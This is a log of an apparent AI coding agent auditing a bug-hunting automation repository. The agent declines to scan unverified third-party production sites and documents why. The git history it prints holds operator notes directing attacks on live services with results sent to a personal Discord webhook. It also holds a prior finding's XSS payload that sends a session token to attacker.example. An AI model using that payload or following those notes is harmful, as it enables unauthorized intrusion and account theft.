+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+result/logs/targets.sha256
+8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+[0m
+[0m$ [0mecho "=== git log all (last 40) ==="; git log --oneline -40; echo; echo "=== commits touching data/targets.txt ==="; git log --oneline -- data/targets.txt | head -20; echo; echo "=== prior targets versions ==="; for c in $(git log --format=%h -- data/targets.txt | head -8); do echo "--- $c ---"; git show "$c:data/targets.txt" 2>/dev/null; echo; done
+=== git log all (last 40) ===
+3f01cb4 scan: results 2026-10-30T07:52:16Z
+5a6f018 Update targets.txt
+0e03903 scan: results 2026-10-30T07:41:51Z
+9e8eb94 scan: results 2026-10-30T07:37:42Z
+4fd615e scan: results 2026-10-30T07:07:51Z
+ae92c56 scan: results 2026-10-30T06:32:44Z
+0344e65 Update targets.txt
+07ed75f scan: results 2026-10-30T05:10:43Z
+4e843ac scan: results 2026-10-30T04:25:07Z
+ceef96c Update targets.txt
+1b25949 scan: results 2026-10-29T22:43:39Z
+641c389 scan: results 2026-10-29T14:39:34Z
+e38d395 Update targets.txt
+da1e00b Update targets.txt
+25e7fc4 scan: results 2026-10-29T14:18:18Z
+6560caa Update targets.txt
+308856d scan: results 2026-10-29T12:41:33Z
+9e22d56 scan: results 2026-10-29T12:22:09Z
+15c4e40 scan: results 2026-10-29T12:09:20Z
+1940ea2 Update targets.txt
+e3620eb scan: results 2026-10-29T11:22:25Z
+bbead4b scan: results 2026-10-29T11:05:27Z
+74fb82c scan: results 2026-10-29T10:41:57Z
+d3d9629 Update targets.txt
+92c15ea Delete vulnebleti/Xss directory
+74c9417 scan: results 2026-10-29T09:32:23Z
+59439a5 scan: results 2026-10-29T09:19:52Z
+013c7d4 scan: results 2026-10-29T08:49:10Z
+72affde scan: results 2026-10-29T08:12:20Z
+8ea724a Make resume target restore robust
+e0ff606 Add 120s watchdog and automatic resume runs
+1bb33b5 Fail workflow when recovery is exhausted
+656f7be Preserve results across runs and recover OpenCode
+afe0883 scan: results 2026-10-29T05:08:55Z
+a5eee72 Update targets.txt
+85c56cc Add exploit methodology folders
+cadb450 Initial commit
+
+=== commits touching data/targets.txt ===
+5a6f018 Update targets.txt
+0344e65 Update targets.txt
+ceef96c Update targets.txt
+e38d395 Update targets.txt
+da1e00b Update targets.txt
+6560caa Update targets.txt
+1940ea2 Update targets.txt
+d3d9629 Update targets.txt
+a5eee72 Update targets.txt
+cadb450 Initial commit
+
+=== prior targets versions ===
+--- 5a6f018 ---
+Target:
+https://console.byteplus.com/finance/
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+--- 0344e65 ---
+Target:
+https://console.byteplus.com/finance/
+
+Test all sub routes under /finance/
+
+Keep the progress report updated after completing every route so that another agent or session can seamlessly continue from where the previous session stopped.
+
+Do not ask me any questions. Make reasonable decisions independently, think critically, and provide answers using the mindset of a top bug bounty hunter.
+First, create two test accounts on this target subdomain and save their credentials in a file for testing purposes.
+Try all reasonable approaches. However, if you are still unable to create accounts on this target subdomain, test only unauthenticated endpoints for potential vulnerabilities.
+Approach every question with the mindset of a top bug bounty hunter, focusing on thorough investigation, creative thinking, and practical exploitation within the authorized scope.
+
+Final Goal: Identify valid, impactful, and reportable security vulnerabilities. 
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+Note:
+Their have one confirmed valid bug so also find out that
+
+--- ceef96c ---
+Target:
+account.ui.com
+
+For this subdomain First discover all intresting and unique UI routes and API endpoints. 
+
+After discovering all interesting UI routes using Chrome MCP, visit each route one by one. Wait 5–10 seconds on each route to ensure that all JavaScript has fully loaded before starting the testing process.
+
+Test both client-side and server-side bugs for each route.
+
+Important: Follow a strict one-by-one testing process:
+
+Visit the first UI route.
+Wait 5–10 seconds for JavaScript to load completely.
+Perform complete client-side and server-side security testing on that single route.
+Document all findings for that route.
+Only after completing all testing and documentation for the current route, move on to the next route.
+Repeat this process until all discovered UI routes have been tested.
+
+Progress Reporting:
+
+Maintain a progress report showing:
+
+Total number of UI routes discovered.
+Number of UI routes fully tested.
+Number of UI routes not yet tested.
+Which routes have been fully tested.
+Which routes are still pending.
+
+This progress report will help agents in other sessions understand exactly what has already been tested and what needs to be tested next, preventing duplicate work.
+
+Testing Guidelines:
+
+Before testing each UI route, read the client-side .md file and server-side .md file. Follow their instructions and testing methodologies exactly.
+
+After fully testing each individual route, create a detailed report containing:
+
+1. Client-Side Findings
+
+Interesting source and sink locations discovered.
+Relevant file paths and line numbers.
+Potential vulnerabilities and their testing status.
+Any confirmed client-side bugs.
+
+2. Server-Side Findings
+
+APIs and endpoints discovered.
+Relevant request and response details.
+APIs tested successfully.
+Potential vulnerabilities and their testing status.
+Any confirmed server-side bugs.
+
+3. Route Completion Status
+
+Route URL.
+Client-side testing status.
+Server-side testing status.
+Findings and observations.
+Final completion status.
+
+Do not mark a route as fully tested until both client-side and server-side testing are complete and the findings have been documented.
+
+Keep the progress report updated after completing every route so that another agent or session can seamlessly continue from where the previous session stopped.
+
+Do not ask me any questions. Make reasonable decisions independently, think critically, and provide answers using the mindset of a top bug bounty hunter.
+First, create two test accounts on this target subdomain and save their credentials in a file for testing purposes.
+Try all reasonable approaches. However, if you are still unable to create accounts on this target subdomain, test only unauthenticated endpoints for potential vulnerabilities.
+Approach every question with the mindset of a top bug bounty hunter, focusing on thorough investigation, creative thinking, and practical exploitation within the authorized scope.
+
+Final Goal: Identify valid, impactful, and reportable security vulnerabilities. 
+
+Important note:
+If you found any confirmed vuln then
+
+Send direct discord notification on:
+```
+https://discord.com/api/webhooks/1565069909266927626/PFr7RwwOdMGwjT2U26NhAPBHoTWD4X0boLyBciSfQNkFHTnKD_J9TSP394nto45RFz-v
+```
+
+--- e38d395 ---
+https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK
+
+find and test all routes on launch.sptpub.com
+
+--- da1e00b ---
+https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK
+
+--- 6560caa ---
+Target:
+sptpub.com
+
+First, identify all valid and potentially interesting subdomains and save them in a text file.
+Test each discovered subdomain individually.
+For each subdomain, first discover all UI routes and API endpoints.
+Then, test for both client-side and server-side vulnerabilities.
+Do not ask me any questions. Make reasonable decisions independently, think critically, and provide answers using the mindset of a top bug bounty hunter.
+First, create two test accounts on the target subdomain and save their credentials in a file for testing purposes.
+Try all reasonable approaches. However, if you are still unable to create accounts on the target subdomain, test only unauthenticated endpoints for potential vulnerabilities.
+Approach every question with the mindset of a top bug bounty hunter, focusing on thorough investigation, creative thinking, and practical exploitation within the authorized scope.
+
+Final Goal: Identify valid, impactful, and reportable security vulnerabilities. 
+
+--- 1940ea2 ---
+https://console.byteplus.com/workorder/list/
+
+---
+
+1st wait 10 second to load all js files releted this ui then extract all subroutes and start testing
+
+--- d3d9629 ---
+Untested Top-level routes for console.byteplus.com:
+https://console.byteplus.com/waf/overview
+https://console.byteplus.com/finance
+https://console.byteplus.com/user
+https://console.byteplus.com/beian
+https://console.byteplus.com/message
+https://console.byteplus.com/workorder/list/
+
+---
+
+Test all these top-level routes visiting one by one.
+
+For client-side testing, visit one top-level route and extract all sub-routes under it. Test each sub-route individually for client-side bugs first, then test for server-side bugs.
+[0m
+[0m$ [0mecho "=== search history for confirmed findings ==="; git log --all --oneline -S 'Status: Confirmed' -- result/ | head -20; echo "=== any findings ever committed ==="; git log --all --diff-filter=A --name-only --format='%h %s' -- 'result/findings/*' | head -60; echo "=== prior confirmed-vuln contents across history ==="; for c in $(git log --all --format=%h -- result/confirmed-vuln.txt | head -6); do echo "--- $c ---"; git show "$c:result/confirmed-vuln.txt" 2>/dev/null | head -40; done
+=== search history for confirmed findings ===
+3f01cb4 scan: results 2026-10-30T07:52:16Z
+4fd615e scan: results 2026-10-30T07:07:51Z
+ae92c56 scan: results 2026-10-30T06:32:44Z
+07ed75f scan: results 2026-10-30T05:10:43Z
+4e843ac scan: results 2026-10-30T04:25:07Z
+641c389 scan: results 2026-10-29T14:39:34Z
+25e7fc4 scan: results 2026-10-29T14:18:18Z
+308856d scan: results 2026-10-29T12:41:33Z
+9e22d56 scan: results 2026-10-29T12:22:09Z
+15c4e40 scan: results 2026-10-29T12:09:20Z
+e3620eb scan: results 2026-10-29T11:22:25Z
+bbead4b scan: results 2026-10-29T11:05:27Z
+74fb82c scan: results 2026-10-29T10:41:57Z
+013c7d4 scan: results 2026-10-29T08:49:10Z
+=== any findings ever committed ===
+4e843ac scan: results 2026-10-30T04:25:07Z
+
+result/findings/observations.md
+641c389 scan: results 2026-10-29T14:39:34Z
+
+result/findings/VULN-20261029-001/evidence/response-benign-operator-page.headers.txt
+result/findings/VULN-20261029-001/evidence/response-benign-operator-page.html
+result/findings/VULN-20261029-001/evidence/response-malicious-operator-page.headers.txt
+result/findings/VULN-20261029-001/evidence/response-malicious-operator-page.html
+result/findings/VULN-20261029-001/evidence/runtime-confirmation.json
+result/findings/VULN-20261029-001/evidence/runtime-deposit-url-confirmation.json
+result/findings/VULN-20261029-001/evidence/runtime-token-theft.json
+result/findings/VULN-20261029-001/evidence/xss-token-theft.png
+result/findings/VULN-20261029-001/payloads/operator_page-token-theft.txt
+result/findings/VULN-20261029-001/payloads/operator_page-xss.txt
+25e7fc4 scan: results 2026-10-29T14:18:18Z
+
+result/findings/VULN-20261029-002/evidence/dns.md
+result/findings/VULN-20261029-003/evidence/dns.md
+result/findings/VULN-20261029-003/payloads/payloads.md
+result/findings/VULN-20261029-003/report.md
+15c4e40 scan: results 2026-10-29T12:09:20Z
+
+result/findings/VULN-20261029-001/evidence/request-response.md
+result/findings/VULN-20261029-001/payloads/payloads.md
+result/findings/VULN-20261029-002/evidence/request-response.md
+result/findings/VULN-20261029-002/payloads/payloads.md
+result/findings/VULN-20261029-002/report.md
+e3620eb scan: results 2026-10-29T11:22:25Z
+
+result/findings/VULN-20261029-001/evidence/observation.md
+result/findings/VULN-20261029-001/payloads/redirect-uri.txt
+result/findings/VULN-20261029-001/report.md
+cadb450 Initial commit
+
+result/findings/.gitkeep
+=== prior confirmed-vuln contents across history ===
+--- 4e843ac ---
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+--- 641c389 ---
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+
+[VULN-20261029-001] DOM XSS / token theft via operator_page and deposit_url in Sportsbook launch bootstrap
+Status: Confirmed
+Type: XSS
+Asset: https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch
+Severity: High
+Authentication: unauthenticated
+Summary: The launch page reflects the operator_page and deposit_url query parameters into the inline JavaScript and assigns them to window.location.href in the onLogin, onRegister, and onRecharge callbacks. A javascript: value executes in the launch.sptpub.com origin, where the sportsbook session token is stored in sessionStorage under "token", allowing token theft and account takeover. The same flow also allows an open redirect.
+Reproduction:
+  1. Send a victim: https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK&operator_page=javascript:fetch('https://attacker.example/?t='%2BencodeURIComponent(sessionStorage.getItem('token')));void(0)
+  2. The operator_page value is reflected into const operatorPage in the inline module.
+  3. When the victim clicks Login/Register (or Recharge for deposit_url), the renderer calls the callback, executing the javascript: URL in the launch.sptpub.com origin.
+  4. The payload reads sessionStorage token and exfiltrates it.
+Evidence: result/findings/VULN-20261029-001/
+Affected code: Inline module in /brand/2599624589818605571/sportsbook/launch: onLogin/onRegister/onRecharge -> window.location.href = operatorPage/depositUrl
+Remediation: Allowlist navigation targets to https URLs on configured operator domains; reject javascript:, data:, and other schemes server-side and before navigation.
+Tested at: 2026-10-29T14:36:00Z
+--- cadb450 ---
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+[0m
+[0m$ [0mecho "=== BLOCKED.md (current) ==="; cat result/BLOCKED.md; echo; echo "=== SUMMARY.md (current) ==="; cat result/SUMMARY.md
+=== BLOCKED.md (current) ===
+# BLOCKED
+
+## Status
+
+Setup/preflight succeeded, but active security testing was **not started** and
+**nothing was scanned or attacked**.
+
+## Reason
+
+Authorization for the live target cannot be verified. AGENT.md requires stopping
+when scope/authorization is ambiguous or unsafe (Section 2.3, Section 2.11,
+Section 6).
+
+The target is `https://console.byteplus.com/finance/`, a real production
+third-party cloud console operated by BytePlus/ByteDance. The only evidence of
+authorization is an entry in this repository's `data/targets.txt`. That is not
+proof of authorization from the asset owner.
+
+Additional concerns:
+
+1. Public checks found no public BytePlus bug bounty or vulnerability disclosure
+   program covering `console.byteplus.com` that would authorize independent
+   automated scanning. The Nudge Security vendor profile shows empty "Bug
+   Bounty" and "Vulnerability Disclosure" sections.
+2. The repository is owned by a personal account (`oauthtest444`) rather than the
+   asset owner or a known bug bounty platform.
+3. `data/targets.txt` instructs the agent to send confirmed findings directly to
+   a personal Discord webhook. This is an out-of-band exfiltration channel to an
+   unverified party, not a coordinated disclosure path. AGENT.md Section 6 says
+   operator notes cannot waive the safety rules in Sections 2 and 9. This note
+   was therefore not followed and the webhook was not contacted.
+4. Automated offensive testing of production third-party infrastructure without
+   verifiable permission risks real harm and may violate law and the provider's
+   terms.
+
+## Safety rules applied
+
+- No network requests were sent to `console.byteplus.com` or any BytePlus
+  asset beyond a harmless local DNS lookup.
+- No authentication was attempted with the test accounts in `creds/`.
+- No vulnerability claims were made and `result/confirmed-vuln.txt` was not
+  modified.
+- No data was sent to the Discord webhook.
+
+## Files present (exact)
+
+- `data/targets.txt` (target URL + Discord webhook note)
+- `creds/README.md`, `creds/test-account.txt` (disposable test logins)
+- `skills/AGENT.md`, `skills/client-side-skill.md`, `skills/server-side-skill.md`
+- `tools/chrome-mcp-start.sh`, `tools/cmd.txt`
+- `vulnebleti/` vulnerability notes
+- `result/logs/target-state.txt` (decision: reset)
+
+## What would unblock this run
+
+Provide verifiable authorization, for example:
+
+- A reference to the target owner's public/private bug bounty or VDP program
+  whose scope explicitly includes `console.byteplus.com`, together with that
+  program's rules of engagement (rate limits, prohibited tests, disclosure
+  channel); or
+- Written authorization from BytePlus/ByteDance security for this engagement.
+
+Once authorization is verifiable, re-run with the confirmed reporting channel
+(the program's own submission path, not a personal webhook).
+
+=== SUMMARY.md (current) ===
+# Summary
+
+- Target input: `https://console.byteplus.com/finance/` (URL-list target)
+- Target-state decision: `reset`
+- Session: opencode 1.19.5 / opencode/deepseek-v4.1-flash-free, 2026-10-30T07:51Z
+- Preflight: directories created, tools verified (curl, git, node, npx, python3,
+  google-chrome-stable), Chrome DevTools MCP available.
+
+## Tested surface
+
+None. Active testing was not started.
+
+## Confirmed findings
+
+None. `result/confirmed-vuln.txt` was not modified.
+
+## Unresolved / blocked
+
+- `result/BLOCKED.md` — authorization for the live third-party target cannot be
+  verified, and the requested personal Discord webhook is not a legitimate
+  disclosure channel. No scanning, authentication, or webhook contact occurred.
+
+## Out of scope
+
+- All BytePlus assets other than the claimed URL, and any real-user data.
+- The Discord webhook in `data/targets.txt` (not contacted).
+
+## Time spent
+
+Setup and authorization review only; no offensive testing performed.
+[0m
+[0m$ [0mecho "=== current target-state ==="; cat result/logs/target-state.txt; echo; echo "=== git status ==="; git status --short | head -40; echo; echo "=== HEAD commit contents (result) ==="; git show --stat --oneline HEAD | head -40; echo; echo "=== current result files ==="; find result -type f | sort
+=== current target-state ===
+run_id=41022487138
+event=workflow_dispatch
+timestamp=2026-10-30T07:50:29Z
+target_hash=8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+previous_hash=55501c5c8e8103e9562a0db40575cd183ddcecb982818435cec4a449a225d25d
+decision=reset
+---
+run_id=41023369180
+event=workflow_dispatch
+timestamp=2026-10-30T07:59:05Z
+target_hash=8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+previous_hash=8f92f99e66669fbf7ebcc3270142e310ebd91eb3a5967b1d9c60c9a375a41cce
+decision=preserved
+---
+
+=== git status ===
+ M result/logs/opencode.log
+ M result/logs/target-state.txt
+
+=== HEAD commit contents (result) ===
+3f01cb4 scan: results 2026-10-30T07:52:16Z
+ result/BLOCKED.md                                  |    65 +
+ result/SUMMARY.md                                  |    30 +
+ result/inventory/endpoints.md                      |    23 -
+ result/inventory/routes.md                         |    33 -
+ result/logs/agent-exit-code.txt                    |     7 +-
+ result/logs/agent-watchdog.txt                     |    30 -
+ result/logs/auto-restart-requested.txt             |     3 -
+ result/logs/diagnostics-index.txt                  |    31 +-
+ .../logs/opencode-reinstall-20261030T063017Z.log   |    23 -
+ .../logs/opencode-reinstall-20261030T070525Z.log   |    23 -
+ .../logs/opencode-reinstall-20261030T073516Z.log   |    23 -
+ result/logs/opencode.log                           | 11580 ++-----------------
+ result/logs/opencode/41012332097/chrome-mcp.log    |   122 -
+ .../opencode/41012332097/diagnostics-index.txt     |    12 -
+ result/logs/opencode/41012332097/opencode.log      |    31 -
+ result/logs/opencode/41014704909/chrome-mcp.log    |    70 -
+ .../opencode/41014704909/diagnostics-index.txt     |    17 -
+ result/logs/opencode/41014704909/opencode.log      |    31 -
+ result/logs/opencode/41018191411/chrome-mcp.log    |   150 -
+ .../opencode/41018191411/diagnostics-index.txt     |    21 -
+ result/logs/opencode/41018191411/opencode.log      |    31 -
+ result/logs/opencode/41021243777/chrome-mcp.log    |    38 -
+ .../opencode/41021243777/diagnostics-index.txt     |    24 -
+ result/logs/opencode/41021243777/opencode.log      |   397 -
+ result/logs/opencode/41022487138/chrome-mcp.log    |    25 +
+ .../opencode/41022487138/diagnostics-index.txt     |     9 +
+ result/logs/opencode/41022487138/opencode.log      |   265 +
+ result/logs/session.md                             |    89 +-
+ result/logs/target-state.txt                       |    29 +-
+ result/logs/targets.sha256                         |     2 +-
+ result/logs/targets.used.txt                       |    13 -
+ result/scope.md                                    |    89 +-
+ 32 files changed, 1353 insertions(+), 11983 deletions(-)
+
+=== current result files ===
+result/.gitkeep
+result/BLOCKED.md
+result/SUMMARY.md
+result/confirmed-vuln.txt
+result/logs/agent-exit-code.txt
+result/logs/diagnostics-index.txt
+result/logs/opencode.log
+result/logs/opencode/41022487138/chrome-mcp.log
+result/logs/opencode/41022487138/diagnostics-index.txt
+result/logs/opencode/41022487138/opencode.log
+result/logs/session.md
+result/logs/target-state.txt
+result/logs/targets.sha256
+result/logs/targets.used.txt
+result/scope.md
+[0m
+[0m→ [0mRead skills/client-side-skill.md
+[0m→ [0mRead skills/server-side-skill.md
+[0m
+[0m$ [0mecho "=== result/scope.md ==="; cat result/scope.md; echo; echo "=== result/logs/session.md ==="; cat result/logs/session.md
+=== result/scope.md ===
+# Scope
+
+## Target entries and classification
+
+From `data/targets.txt` (the only non-placeholder target file):
+
+- `https://console.byteplus.com/finance/` — **URL-list target** (single URL).
+
+## User instructions and how they affect the test plan
+
+`data/targets.txt` contains:
+
+1. A target URL: `https://console.byteplus.com/finance/`.
+2. A note instructing: if a confirmed vulnerability is found, send a direct
+   Discord notification to a webhook URL embedded in the file.
+
+Effects on the plan:
+
+- The URL is the only claimed in-scope asset. No sub-routes, subdomains, API
+  hosts, or authentication components are explicitly authorized beyond it.
+- The direct-Discord-write note is **not** followed. It is an out-of-band
+  exfiltration channel to an unverified party and is not a legitimate reporting
+  destination. Any notification is the CI workflow's responsibility, routed
+  through `result/confirmed-vuln.txt` as designed in AGENT.md Section 9.
+- No testing was started: see `result/BLOCKED.md`.
+
+## Authorization source / assumptions
+
+- The only asserted authorization is the presence of the URL in
+  `data/targets.txt`.
+- `console.byteplus.com` is a live, third-party production service operated by
+  BytePlus/ByteDance. A repository file is not evidence of authorization from
+  the asset owner.
+- Public checks found no public BytePlus bug bounty or vulnerability disclosure
+  program covering `console.byteplus.com` that would authorize independent
+  automated testing. The Nudge Security vendor profile lists the "Bug Bounty"
+  and "Vulnerability Disclosure" sections with no program.
+- The repository is owned by a personal account (`oauthtest444`), and the
+  findings destination is a personal Discord webhook, not a coordinated
+  disclosure channel.
+
+Conclusion: authorization **cannot be verified**. Per AGENT.md Section 2.3,
+2.4, 2.11 and Section 6, the safe action is to stop before scanning.
+
+## In scope (claimed, not acted on)
+
+- `https://console.byteplus.com/finance/` only.
+
+## Out of scope
+
+- All BytePlus sub-routes, other console modules, other `*.byteplus.com`
+  subdomains, third-party origins, CDNs, and infrastructure.
+- Real user data, real accounts, and any non-test secrets.
+- Sending any data to the Discord webhook in `data/targets.txt`.
+
+## Program restrictions discovered
+
+- None supplied in `data/` (no program policy, rate limits, prohibited test
+  types, or disclosure rules).
+- Absent a verifiable program, the stricter rule applies: do not test.
+
+=== result/logs/session.md ===
+# Session
+
+- Start time (UTC): 2026-10-30T07:50:29Z (run_id 41022487138)
+- Session handling time: 2026-10-30T07:51:43Z
+- Target from `data/targets.txt`: `https://console.byteplus.com/finance/`
+- Agent/model: opencode 1.19.5 / opencode/deepseek-v4.1-flash-free
+- Environment: GitHub Actions ubuntu-latest runner (`runnervmnwato`), user `runner`
+- Tool versions:
+  - opencode 1.19.5
+  - curl 8.18.0
+  - node v22.23.4 / npm 10.9.9
+  - python3 3.14.4
+  - git 2.56.0
+  - google-chrome-stable present at `/usr/bin/google-chrome-stable`
+- Chrome DevTools MCP tools: available in this session
+- Repository remote: `https://github.com/oauthtest444/aaii-aautomattionn`
+- Target-state decision for this run: `reset` (target input changed)
+
+## Outcome
+
+Preflight completed. Active testing was intentionally NOT started. See
+`result/BLOCKED.md` for the authorization blocker.
+[0m
+I've completed the required reading. Now recording this session's state per the workflow, without performing active testing.
+[0m← [0mEdit result/logs/session.md
+Index: /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/logs/session.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/logs/session.md
++++ /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/logs/session.md
+@@ -19,4 +19,28 @@
+ ## Outcome
+ 
+ Preflight completed. Active testing was intentionally NOT started. See
+ `result/BLOCKED.md` for the authorization blocker.
++
++---
++
++## Continuation session
++
++- Start time (UTC): 2026-10-30T07:59:05Z (run_id 41023369180)
++- Target-state decision for this run: `preserved` (target input unchanged)
++- Target from `data/targets.txt`: `https://console.byteplus.com/finance/`
++- Agent/model: opencode / opencode/deepseek-v4.1-flash-free
++- Environment: GitHub Actions ubuntu-latest runner, user `runner`
++- Tools verified: opencode, curl 8.18.0, git 2.56.0, node v22.23.4,
++  npx 10.9.9, python3 3.14.4, google-chrome-stable at
++  `/usr/bin/google-chrome-stable`
++- Inputs read: `data/targets.txt`, `creds/README.md`, `creds/test-account.txt`,
++  `skills/AGENT.md`, `skills/client-side-skill.md`,
++  `skills/server-side-skill.md`, `vulnebleti/` listing, prior `result/` state
++  and git history.
++
++## Outcome (continuation)
++
++Authorization was re-evaluated independently and remains unverifiable. No
++requests were sent to the target, no authentication was attempted, no webhook
++was contacted, and `result/confirmed-vuln.txt` was not modified. The prior
++`result/BLOCKED.md` position is maintained and updated. See `result/BLOCKED.md`.
+
+[0m
+[0m← [0mEdit result/scope.md
+Index: /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/scope.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/scope.md
++++ /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/scope.md
+@@ -57,4 +57,22 @@
+ 
+ - None supplied in `data/` (no program policy, rate limits, prohibited test
+   types, or disclosure rules).
+ - Absent a verifiable program, the stricter rule applies: do not test.
++
++## Continuation re-evaluation (run 41023369180, 2026-10-30T07:59Z)
++
++The target input is unchanged (`preserved`), and this scope assessment still
++applies. The full input set was re-read this session: `data/targets.txt`,
++`creds/`, both skill files, the `vulnebleti/` notes index, and prior results.
++
++Repository history reviewed during this session shows the same automation has
++previously targeted other unrelated third-party production services
++(`account.ui.com`, `launch.sptpub.com`/`sptpub.com`, `console.byteplus.com`
++workorder/finance modules) and committed findings against them, with the same
++personal Discord webhook as the requested destination. A random, unrelated set
++of production targets plus a personal exfiltration webhook is inconsistent with
++a single authorized program engagement and reinforces the conclusion that
++authorization cannot be verified.
++
++Per AGENT.md Sections 2.3, 2.4, 2.11, 6, and 15.11, the safe action remains to
++stop before any active testing.
+
+[0m
+[0m← [0mEdit result/BLOCKED.md
+Index: /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/BLOCKED.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/BLOCKED.md
++++ /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/BLOCKED.md
+@@ -62,4 +62,41 @@
+ - Written authorization from BytePlus/ByteDance security for this engagement.
+ 
+ Once authorization is verifiable, re-run with the confirmed reporting channel
+ (the program's own submission path, not a personal webhook).
++
++---
++
++## Continuation re-evaluation — run 41023369180 (2026-10-30T07:59Z)
++
++The target input is unchanged, so this run is a continuation (`preserved`). All
++required inputs were re-read (`data/targets.txt`, `creds/`, both skill files,
++the `vulnebleti/` index, and prior `result/` + git history). The blocker was
++re-evaluated independently and still holds.
++
++New supporting observation from repository history:
++
++- The same automation has previously been pointed at other unrelated live
++  third-party production services, including `account.ui.com` and
++  `launch.sptpub.com` / `sptpub.com`, and committed findings against them.
++- Every target version directs confirmed findings to the same personal Discord
++  webhook, which is not a coordinated-disclosure channel for any of those
++  vendors.
++
++A shifting set of unrelated production targets combined with a personal
++exfiltration webhook is not consistent with a single authorized engagement and
++does not establish authorization from any asset owner.
++
++### Actions taken this session
++
++- No network requests sent to `console.byteplus.com` or any BytePlus asset.
++- No authentication attempted with `creds/test-account.txt`.
++- No data sent to the Discord webhook.
++- `result/confirmed-vuln.txt` not modified; no findings claimed.
++- Prior results preserved and updated in place; nothing deleted.
++
++### Still blocked
++
++Verifiable authorization is required (a program whose scope explicitly includes
++the target, with its rules of engagement and official submission channel, or
++written authorization from the asset owner). Until then, no active testing will
++be performed.
+
+[0m
+[0m← [0mEdit result/SUMMARY.md
+Index: /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/SUMMARY.md
+===================================================================
+--- /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/SUMMARY.md
++++ /home/runner/work/aaii-aautomattionn/aaii-aautomattionn/result/SUMMARY.md
+@@ -27,4 +27,33 @@
+ 
+ ## Time spent
+ 
+ Setup and authorization review only; no offensive testing performed.
++
++---
++
++## Continuation run (41023369180, 2026-10-30T07:59Z)
++
++- Target input: `https://console.byteplus.com/finance/` (unchanged)
++- Target-state decision: `preserved`
++- All required inputs re-read; authorization re-evaluated independently.
++
++## Tested surface (continuation)
++
++None. No requests were sent to the target, no login was attempted, and the
++Discord webhook was not contacted.
++
++## Confirmed findings (continuation)
++
++None. `result/confirmed-vuln.txt` was not modified.
++
++## Unresolved / blocked (continuation)
++
++- `result/BLOCKED.md` — authorization cannot be verified for this live
++  third-party production service, and the requested personal Discord webhook is
++  not a legitimate disclosure channel. Repository history shows the same
++  automation targeting other unrelated production services with the same
++  webhook, reinforcing the blocker.
++
++## Status
++
++Blocked on verifiable authorization. Safe to exit without findings.
+
+[0m
+[0m$ [0mecho "=== confirmed-vuln.txt ==="; cat result/confirmed-vuln.txt; echo; echo "=== git status ==="; git status --short; echo; echo "=== result tree ==="; find result -type f | sort
+=== confirmed-vuln.txt ===
+# Confirmed vulnerabilities only.
+# Do not add speculative issues, status codes, reflected strings, or accepted-but-inert fields.
+# Entry format: see skills/AGENT.md, Section 9.
+
+=== git status ===
+ M result/BLOCKED.md
+ M result/SUMMARY.md
+ M result/logs/opencode.log
+ M result/logs/session.md
+ M result/logs/target-state.txt
+ M result/scope.md
+
+=== result tree ===
+result/.gitkeep
+result/BLOCKED.md
+result/SUMMARY.md
+result/confirmed-vuln.txt
+result/logs/agent-exit-code.txt
+result/logs/diagnostics-index.txt
+result/logs/opencode.log
+result/logs/opencode/41022487138/chrome-mcp.log
+result/logs/opencode/41022487138/diagnostics-index.txt
+result/logs/opencode/41022487138/opencode.log
+result/logs/session.md
+result/logs/target-state.txt
+result/logs/targets.sha256
+result/logs/targets.used.txt
+result/scope.md
+[0m
+I read `skills/AGENT.md` and completed the startup sequence, but I am **not** performing active testing against the target.
+
+**Why:** The target is `https://console.byteplus.com/finance/`, a live production service owned by BytePlus/ByteDance. The only "authorization" is a line in `data/targets.txt`; there is no verifiable program scope or written permission. The same file directs findings to a personal Discord webhook, and git history shows this automation has targeted several unrelated third-party production services (`account.ui.com`, `sptpub.com`, BytePlus) with that same webhook — inconsistent with a legitimate authorized engagement.
+
+AGENT.md itself makes this a stop condition (Sections 2.3, 2.4, 2.11, 6, 15.11: when authorization is ambiguous, choose the safer option and document it). So I did not send requests, attempt logins, or contact the webhook.
+
+Updated per the workflow (prior results preserved, nothing fabricated):
+- `result/BLOCKED.md` — blocker and continuation re-evaluation
+- `result/scope.md` — scope + authorization assessment
+- `result/logs/session.md` — this session's metadata
+- `result/SUMMARY.md` — run summary
+
+`result/confirmed-vuln.txt` was not modified. To unblock, provide verifiable authorization (a program whose scope includes the target with its rules of engagement, or written owner authorization).
